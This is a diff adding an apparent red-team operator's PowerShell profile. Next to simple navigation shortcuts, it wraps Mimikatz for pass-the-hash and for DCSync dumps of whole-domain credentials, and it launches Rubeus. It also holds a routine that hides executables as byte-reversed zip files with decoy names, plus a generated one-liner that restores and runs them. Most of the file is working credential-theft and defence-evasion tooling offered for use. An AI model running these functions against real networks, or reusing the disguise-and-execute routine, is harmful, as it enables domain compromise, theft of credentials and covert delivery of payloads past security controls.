@@ -1,0 +1,256 @@
+function xdrive()
+{
+    net use X: \\<IP_ADDRESS>\optumshadow-drive /persistent:Yes /user:<DOMAIN>\<USERNAME> '<PASSWORD>'
+}
+
+New-PSDrive -Name Z -PSProvider FileSystem -Root "\\Mac\Home"
+New-PSDrive -Name Y -PSProvider FileSystem -Root "\\Mac\repos"
+xdrive
+
+function prompt {
+    Write-Host ($Env:VMname + " " + $(Get-Date)) -ForegroundColor Green
+    Write-Host ("PS " + $(Get-Location) + " >") -NoNewLine -ForegroundColor White
+    return " "
+}
+
+function rubeus {
+    Z:\Documents\Github\SharpCollection\NetFramework_4.7_x64\Rubeus.exe $args
+}
+
+function mimikatz {
+    C:\Mac\Home\Documents\Github\cdo-acd\UHG-Mimikatz\Releases\mimikatz-arm64.exe
+}
+
+function ksetup {
+    if ($args.Count -eq 2) {
+        ksetup.exe /addkdc $args[0].ToUpper() $args[1]
+        ksetup.exe /setrealmflags $args[0].ToUpper() tcpsupported
+    }
+    elseif ($args.Count -eq 0) {
+        ksetup.exe
+    }
+    else {
+        Write-Output "Usage: ksetup or ksetup <DOMAIN> <KDC>"
+    }
+}
+
+function pth {
+    if ($args.Count -ne 3) {
+        Write-Output "Usage: pth <USERNAME> <DOMAIN> <NTLM HASH>"
+    }
+    else {
+        C:\Mac\Home\Documents\Github\cdo-acd\UHG-Mimikatz\Releases\mimikatz-arm64.exe "sekurlsa::pth /user:$($args[0]) /domain:$($args[1]) /ntlm:$($args[2]) /run:powershell.exe" "exit"
+    }
+}
+
+function dcsync {
+    if ($args.Count -ne 2 -and $args.Count -ne 3) {
+        Write-Output "Usage: dcsync <DOMAIN> <DC> [USERNAME]"
+        Write-Output "`tRunning without USERNAME dcsyncs the entire environment, with USERNAME dcsyncs only that user"
+    }
+    else {
+        if ($args.Count -eq 2) {
+            C:\Mac\Home\Documents\Github\cdo-acd\UHG-Mimikatz\Releases\mimikatz-arm64.exe "log C:\Mac\Home\Documents\Ops\$($args[0]).log" "lsadump::dcsync /domain:$($args[0]) /dc:$($args[1]) /all /csv" "exit"
+        }
+        elseif ($args.Count -eq 3) {
+            C:\Mac\Home\Documents\Github\cdo-acd\UHG-Mimikatz\Releases\mimikatz-arm64.exe "log C:\Mac\Home\Documents\Ops\$($args[0])-$($args[2]).log" "lsadump::dcsync /domain:$($args[0]) /dc:$($args[1]) /user:$($args[2])" "exit"
+        }
+    }
+}
+
+function desktop {
+    cd Z:\Desktop
+}
+
+function downloads {
+    cd Z:\Downloads
+}
+
+function documents {
+    cd Z:\Documents
+}
+
+function github {
+    cd Z:\Documents\Github
+}
+
+function cdo-acd {
+    cd Z:\Documents\Github\cdo-acd
+}
+
+# Untested
+function runas {
+    runas /netonly /noprofile /user:"$($args[0])" powershell.exe
+}
+
+# ============================================================================
+# Reversed Archive Functions - Copy this entire block to your PowerShell profile
+# ============================================================================
+
+function New-ReversedArchive {
+    <#
+    .SYNOPSIS
+        Creates a reversed byte-order zip archive from an executable
+
+    .PARAMETER ExePath
+        Path to the source executable
+
+    .PARAMETER RenamedExe
+        Name for the exe within the zip archive (e.g., "WindowSpy.exe")
+    #>
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$ExePath,
+
+        [Parameter(Mandatory=$true)]
+        [string]$RenamedExe
+    )
+
+    # Resolve full path
+    $SourcePath = Resolve-Path $ExePath
+    $WorkingDir = Split-Path $SourcePath -Parent
+    $BaseName = [System.IO.Path]::GetFileNameWithoutExtension($RenamedExe)
+
+    # Paths for output files
+    $RenamedPath = Join-Path $WorkingDir $RenamedExe
+    $ZipPath = Join-Path $WorkingDir "$BaseName.zip"
+    $DataPath = Join-Path $WorkingDir "$BaseName.data"
+
+    try {
+        # Step 1: Copy exe with new name
+        Write-Host "[+] Copying $SourcePath -> $RenamedPath" -ForegroundColor Cyan
+        Copy-Item -Path $SourcePath -Destination $RenamedPath -Force
+
+        # Step 2: Zip the renamed exe
+        Write-Host "[+] Creating zip archive: $ZipPath" -ForegroundColor Cyan
+        if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force }
+        Compress-Archive -Path $RenamedPath -DestinationPath $ZipPath -CompressionLevel Optimal
+
+        # Step 3: Reverse bytes and create .data file
+        Write-Host "[+] Reversing bytes and creating: $DataPath" -ForegroundColor Cyan
+        $bytes = [System.IO.File]::ReadAllBytes($ZipPath)
+        [Array]::Reverse($bytes)
+        [System.IO.File]::WriteAllBytes($DataPath, $bytes)
+
+        # Step 4: Calculate hashes
+        Write-Host "`n[+] File Hashes:" -ForegroundColor Green
+        Write-Host "=" * 80 -ForegroundColor Gray
+
+        foreach ($file in @($RenamedPath, $ZipPath, $DataPath)) {
+            $fileName = Split-Path $file -Leaf
+            Write-Host "`n  File: $fileName" -ForegroundColor Yellow
+
+            $md5 = (Get-FileHash -Path $file -Algorithm MD5).Hash
+            $sha1 = (Get-FileHash -Path $file -Algorithm SHA1).Hash
+            $sha256 = (Get-FileHash -Path $file -Algorithm SHA256).Hash
+
+            Write-Host "    MD5   : $md5" -ForegroundColor White
+            Write-Host "    SHA1  : $sha1" -ForegroundColor White
+            Write-Host "    SHA256: $sha256" -ForegroundColor White
+        }
+
+        Write-Host "`n" + ("=" * 80) -ForegroundColor Gray
+        Write-Host "[+] Output file: $DataPath" -ForegroundColor Green
+
+        # Clean up renamed exe
+        Remove-Item $RenamedPath -Force
+
+    } catch {
+        Write-Host "[!] Error: $_" -ForegroundColor Red
+    }
+}
+
+function Get-ReverseArchiveCommands {
+    <#
+    .SYNOPSIS
+        Generates PowerShell commands to reverse and extract an archive
+
+    .PARAMETER DestinationPath
+        The working directory path where commands will be executed
+
+    .PARAMETER DataFile
+        Full path to the .data file to process
+
+    .PARAMETER ZipFile
+        Full path for the output .zip file
+
+    .PARAMETER ExePath
+        Full path to the executable to run after extraction
+    #>
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$DestinationPath,
+
+        [Parameter(Mandatory=$true)]
+        [string]$DataFile,
+
+        [Parameter(Mandatory=$true)]
+        [string]$ZipFile,
+
+        [Parameter(Mandatory=$true)]
+        [string]$ExePath
+    )
+
+    $commands = @"
+cd "$DestinationPath"
+`$b=[System.IO.File]::ReadAllBytes("$DataFile")
+[Array]::Reverse(`$b)
+[System.IO.File]::WriteAllBytes("$ZipFile",`$b)
+Expand-Archive -Path "$ZipFile" -DestinationPath .
+Start-Process -NoNewWindow "$ExePath"
+"@
+
+    Write-Host $commands
+
+    # Also copy to clipboard if available
+    try {
+        $commands | Set-Clipboard
+        Write-Host "`n[+] Commands copied to clipboard" -ForegroundColor Green
+    } catch {
+        # Clipboard not available, ignore
+    }
+}
+
+# ============================================================================
+# Convenient Aliases
+# ============================================================================
+
+function zipreverse {
+    param(
+        [Parameter(Position=0, Mandatory=$true)]
+        [string]$ExePath,
+
+        [Parameter(Position=1, Mandatory=$true)]
+        [string]$RenamedExe
+    )
+
+    New-ReversedArchive -ExePath $ExePath -RenamedExe $RenamedExe
+}
+
+function zipunreverse {
+    # Join all arguments to support paths with spaces without quotes
+    $DataFilePath = $args -join ' '
+
+    if ([string]::IsNullOrWhiteSpace($DataFilePath)) {
+        Write-Host "[!] Error: Please provide a path to the .data file" -ForegroundColor Red
+        Write-Host "Usage: zipunreverse C:\path\to\file.data" -ForegroundColor Yellow
+        return
+    }
+
+    # Derive the parameters from the .data file path
+    $DestinationPath = Split-Path -Path $DataFilePath -Parent
+    $ZipFile = $DataFilePath -replace '\.data$', '.zip'
+    $ExePath = $DataFilePath -replace '\.data$', '.exe'
+
+    Get-ReverseArchiveCommands `
+        -DestinationPath $DestinationPath `
+        -DataFile $DataFilePath `
+        -ZipFile $ZipFile `
+        -ExePath $ExePath
+}
+
+# ============================================================================
+# Usage examples:
+# zipreverse "C:\path\to\myapp.exe" "WindowSpy.exe"
+# zipunreverse "C:\programdata\ssh\microsoft_virtualizer.data"
+# ============================================================================
